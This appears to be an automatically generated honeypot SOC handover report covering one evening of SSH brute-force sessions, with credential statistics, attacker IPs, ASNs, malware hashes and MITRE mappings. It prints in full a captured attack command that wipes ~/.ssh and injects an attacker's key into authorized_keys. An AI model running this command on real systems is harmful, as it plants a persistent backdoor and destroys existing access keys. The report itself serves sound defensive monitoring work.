# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T20:27:58Z |
| **Shift Time** | 20:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **41** |
| Confirmed Threats | **38** |
| False Positives Filtered | **3** (7.3%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **17** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **34** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **24** |
| Unique Credential Pairs | **22** |
| Unique Usernames | **15** |
| Unique Passwords | **22** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `nobody` | 3 |
| `admin` | 2 |
| `config` | 1 |
| `Ubnt` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `root2018` | 2 |
| `2020` | 2 |
| `qwerty12345` | 1 |
| `admin2014` | 1 |
| `123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `root2018` | 2 |
| `root` | `2020` | 2 |
| `config` | `qwerty12345` | 1 |
| `admin` | `admin2014` | 1 |
| `Ubnt` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2018` | `74.218.95.154` | 2026-03-28T18:45:23 |
| `root` | `root2018` | `14.29.204.161` | 2026-03-28T18:45:40 |
| `root` | `2020` | `196.189.59.226` | 2026-03-28T19:20:57 |
| `root` | `2020` | `111.70.32.6` | 2026-03-28T19:21:05 |
| `root` | `abcqwe123` | `52.187.9.8` | 2026-03-28T19:40:38 |
| `root` | `3245gs5662d34` | `52.187.9.8` | 2026-03-28T19:40:41 |
| `root` | ` ` | `8.217.77.179` | 2026-03-28T19:57:16 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `52.187.9.8`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **28** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS17421` | Mobile Business Group | 3 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS4780` | Digital United Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0599bb00119e

| Field | Detail |
|---|---|
| **Source IP** | `74.218.95[.]154` |
| **First Seen** | 2026-03-28 18:45 |
| **Last Seen** | 2026-03-28 18:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 18:45:21` | `cowrie.session.connect` |
| `2026-03-28 18:45:22` | `cowrie.client.version` |
| `2026-03-28 18:45:22` | `cowrie.client.kex` |
| `2026-03-28 18:45:23` | `cowrie.login.success` |
| `2026-03-28 18:45:24` | `cowrie.direct-tcpip.request` |
| `2026-03-28 18:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.218.95[.]154` to AbuseIPDB if not already reported
- [ ] Block `74.218.95[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f432a42b84e

| Field | Detail |
|---|---|
| **Source IP** | `14.29.204[.]161` |
| **First Seen** | 2026-03-28 18:45 |
| **Last Seen** | 2026-03-28 18:45 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 18:45:34` | `cowrie.session.connect` |
| `2026-03-28 18:45:38` | `cowrie.client.version` |
| `2026-03-28 18:45:38` | `cowrie.client.kex` |
| `2026-03-28 18:45:40` | `cowrie.login.success` |
| `2026-03-28 18:45:41` | `cowrie.direct-tcpip.request` |
| `2026-03-28 18:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.204[.]161` to AbuseIPDB if not already reported
- [ ] Block `14.29.204[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542a4e9d617a

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-03-28 19:20 |
| **Last Seen** | 2026-03-28 19:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 19:20:55` | `cowrie.session.connect` |
| `2026-03-28 19:20:56` | `cowrie.client.version` |
| `2026-03-28 19:20:56` | `cowrie.client.kex` |
| `2026-03-28 19:20:57` | `cowrie.login.success` |
| `2026-03-28 19:20:57` | `cowrie.direct-tcpip.request` |
| `2026-03-28 19:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fa2efa0dfd

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-03-28 19:21 |
| **Last Seen** | 2026-03-28 19:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 19:21:03` | `cowrie.session.connect` |
| `2026-03-28 19:21:03` | `cowrie.client.version` |
| `2026-03-28 19:21:03` | `cowrie.client.kex` |
| `2026-03-28 19:21:05` | `cowrie.login.success` |
| `2026-03-28 19:21:06` | `cowrie.direct-tcpip.request` |
| `2026-03-28 19:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81dc9b9e9f03

| Field | Detail |
|---|---|
| **Source IP** | `52.187.9[.]8` |
| **First Seen** | 2026-03-28 19:40 |
| **Last Seen** | 2026-03-28 19:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 19:40:38` | `cowrie.session.connect` |
| `2026-03-28 19:40:38` | `cowrie.client.version` |
| `2026-03-28 19:40:38` | `cowrie.client.kex` |
| `2026-03-28 19:40:38` | `cowrie.login.success` |
| `2026-03-28 19:40:39` | `cowrie.session.params` |
| `2026-03-28 19:40:39` | `cowrie.command.input` |
| `2026-03-28 19:40:39` | `cowrie.command.failed` |
| `2026-03-28 19:40:39` | `cowrie.log.closed` |
| `2026-03-28 19:40:39` | `cowrie.session.params` |
| `2026-03-28 19:40:39` | `cowrie.command.input` |
| `2026-03-28 19:40:39` | `cowrie.session.file_download` |
| `2026-03-28 19:40:39` | `cowrie.log.closed` |
| `2026-03-28 19:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.187.9[.]8` to AbuseIPDB if not already reported
- [ ] Block `52.187.9[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81983db330f1

| Field | Detail |
|---|---|
| **Source IP** | `52.187.9[.]8` |
| **First Seen** | 2026-03-28 19:40 |
| **Last Seen** | 2026-03-28 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 19:40:40` | `cowrie.session.connect` |
| `2026-03-28 19:40:40` | `cowrie.client.version` |
| `2026-03-28 19:40:41` | `cowrie.client.kex` |
| `2026-03-28 19:40:41` | `cowrie.login.success` |
| `2026-03-28 19:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.187.9[.]8` to AbuseIPDB if not already reported
- [ ] Block `52.187.9[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76fa53442bd5

| Field | Detail |
|---|---|
| **Source IP** | `8.217.77[.]179` |
| **First Seen** | 2026-03-28 19:57 |
| **Last Seen** | 2026-03-28 19:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 19:57:16` | `cowrie.session.connect` |
| `2026-03-28 19:57:16` | `cowrie.client.version` |
| `2026-03-28 19:57:16` | `cowrie.client.kex` |
| `2026-03-28 19:57:16` | `cowrie.login.success` |
| `2026-03-28 19:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.77[.]179` to AbuseIPDB if not already reported
- [ ] Block `8.217.77[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.245.95[.]11` | **2** | 2026-03-28 19:24 | 2026-03-28 19:40 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `110.25.109[.]54` | 1 | 2026-03-28 19:39 | 2026-03-28 19:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.253.112[.]252` | 1 | 2026-03-28 19:49 | 2026-03-28 19:50 | 30s | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]251` | 1 | 2026-03-28 19:01 | 2026-03-28 19:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.32[.]11` | 1 | 2026-03-28 19:42 | 2026-03-28 19:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.33.157[.]48` | 1 | 2026-03-28 20:15 | 2026-03-28 20:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `115.137.64[.]30` | 1 | 2026-03-28 19:23 | 2026-03-28 19:24 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.196.22[.]11` | 1 | 2026-03-28 19:51 | 2026-03-28 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.243.121[.]22` | 1 | 2026-03-28 19:05 | 2026-03-28 19:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]225` | 1 | 2026-03-28 19:48 | 2026-03-28 19:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.48.251[.]107` | 1 | 2026-03-28 18:46 | 2026-03-28 18:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-28 19:50 | 2026-03-28 19:50 | 32s | 0 | `T1592` | 🟢 LOW |
| `175.180.129[.]87` | 1 | 2026-03-28 20:23 | 2026-03-28 20:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.10.201[.]191` | 1 | 2026-03-28 19:44 | 2026-03-28 19:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.52[.]146` | 1 | 2026-03-28 19:59 | 2026-03-28 19:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.243.120[.]50` | 1 | 2026-03-28 18:41 | 2026-03-28 18:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.153.228[.]81` | 1 | 2026-03-28 20:15 | 2026-03-28 20:15 | 16s | 0 | `T1592` | 🟢 LOW |
| `216.236.215[.]9` | 1 | 2026-03-28 20:04 | 2026-03-28 20:04 | 8s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]70` | 1 | 2026-03-28 19:05 | 2026-03-28 19:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]13` | 1 | 2026-03-28 20:19 | 2026-03-28 20:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.187.9[.]8` | 1 | 2026-03-28 19:40 | 2026-03-28 19:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.72.115[.]182` | 1 | 2026-03-28 20:11 | 2026-03-28 20:11 | 31s | 0 | `T1592` | 🟢 LOW |
| `77.106.78[.]215` | 1 | 2026-03-28 19:24 | 2026-03-28 19:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.83.13[.]247` | 1 | 2026-03-28 18:40 | 2026-03-28 18:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.105.2[.]51` | 1 | 2026-03-28 19:20 | 2026-03-28 19:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.196.152[.]183` | 1 | 2026-03-28 20:01 | 2026-03-28 20:01 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]196` | 1 | 2026-03-28 20:03 | 2026-03-28 20:03 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]211` | 1 | 2026-03-28 20:01 | 2026-03-28 20:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.84.21[.]186` | 1 | 2026-03-28 19:05 | 2026-03-28 19:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.8.148[.]37` | 1 | 2026-03-28 19:59 | 2026-03-28 19:59 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.253.112[.]252` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 2 |
| `49.124.153[.]13` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 20 |
| `175.180.129[.]87` | TW | New Century InfoComm Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `111.70.32[.]11` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 8 |
| `114.33.157[.]48` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 3 |
| `83.83.13[.]247` | NL | Ziggo Consumers | **100** ⚠️ | 26 |
| `91.196.152[.]211` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `111.70.32[.]6` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 39 |
| `216.236.215[.]9` | US | New Skies Satellites, Inc. | **100** ⚠️ | 16 |
| `210.245.95[.]11` | VN | FPT Telecom Company | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 29 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 41 cases |
| Tool 34  | Credential Extractor        | ✅ 24 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (7.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 30 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T20:27:58Z_
